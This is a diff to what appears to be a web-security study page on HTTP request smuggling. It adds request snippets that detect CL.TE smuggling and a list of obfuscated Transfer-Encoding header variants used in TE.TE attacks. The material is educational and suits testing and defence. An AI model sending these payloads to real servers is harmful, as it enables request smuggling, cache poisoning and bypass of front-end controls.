@@ -10,6 +10,7 @@ HTTP request smuggling is a server-side attack that takes advantage of discrepan
     - [prepare smuggling](#prepare)
     - [Detect type of smuggling](#detect-type-of-smuggling)
     - [CL.TE vulnerabilities](#clte-vulnerabilities)
+    - [TE.TE: obfuscating the TE header](#tete-obfuscating-the-te-header)
 
 ## Explanation
 
@@ -74,6 +75,24 @@ Classic request smuggling attacks involve placing both the Content-Length header
 
 ![detect](/web/img/detect-smugglin.png)
 
+```
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+X
+```
+
+```
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+```
+
 ### CL.TE vulnerabilities
 
 The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
@@ -113,6 +132,32 @@ Transfer-Encoding: chunked
 SMUGGLED
 0
 ```
+
+### TE.TE: obfuscating the TE header
+
+TE.TE vulnerability, it is necessary to find some variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it, while the other server ignores it.
+
+There are potentially endless ways to obfuscate the Transfer-Encoding header. For example:
+
+```
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+```
+
+
 
 ---
 
